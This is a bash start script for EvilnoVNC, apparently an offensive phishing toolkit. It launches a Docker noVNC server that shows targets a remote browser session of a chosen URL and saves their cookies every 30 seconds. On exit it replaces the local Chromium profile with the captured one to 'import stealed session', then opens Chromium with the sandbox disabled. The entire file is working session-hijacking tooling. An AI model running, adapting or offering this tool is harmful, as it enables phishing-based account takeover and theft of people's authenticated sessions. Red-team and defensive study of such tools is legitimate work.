#!/bin/bash
#=============================#
#   EvilnoVNC by @JoelGMSec   #
#     https://darkbyte.net    #
#=============================#

# Banner
printf "\e[1;34m                                                     
  _____       _ _          __     ___   _  ____ 
 | ____|_   _(_) |_ __   __\ \   / / \ | |/ ___|
 |  _| \ \ / / | | '_ \ / _ \ \ / /|  \| | |    
 | |___ \ V /| | | | | | (_) \ V / | |\  | |___ 
 |_____| \_/ |_|_|_| |_|\___/ \_/  |_| \_|\____|                                                
                                             
\e[1;32m  ---------------- by @JoelGMSec --------------\n\e[1;0m" 

# Help & Usage
function help {
printf "\n\e[1;33mUsage:\e[1;0m ./start.sh \e[1;35m\$resolution \e[1;34m\$url\n\n"
printf "\e[1;33mExamples:\n"
printf "\e[1;32m\t1280x720  16bits: \e[1;0m./start.sh \e[1;35m1280x720x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1280x720  24bits: \e[1;0m./start.sh \e[1;35m1280x720x24 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 16bits: \e[1;0m./start.sh \e[1;35m1920x1080x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n"
}

if [[ $# -lt 2 ]] ; then help
if [[ $# -lt 1 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
fi ; exit 0 ; fi

# Variables
RESOLUTION=$1
WEBPAGE=$2

# Main function
if docker -v &> /dev/null ; then
if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
sudo service docker start > /dev/null 2>&1 ; sleep 3 ; fi ; fi
sudo docker run -d --rm -p 5980:5980 -v "${PWD}/Downloads":"/home/user/Downloads" -e RESOLUTION=$RESOLUTION -e WEBPAGE=$WEBPAGE --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 3
printf "\n\e[1;34m[+] URL: http://localhost:5980" ; sleep 3
printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 3
printf "\n\e[1;32m[+] Cookies will updated every 30 seconds.. \e[1;31m"

trap 'printf "\n\e[1;33m[>] Import stealed session to Chromium.." ; sleep 3
docker stop evilnovnc > /dev/null 2>&1 &
rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
printf "\n\e[1;32m[+] Done!\n\e[1;0m"
/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &' SIGTERM EXIT
while true ; do sleep 30 ; done
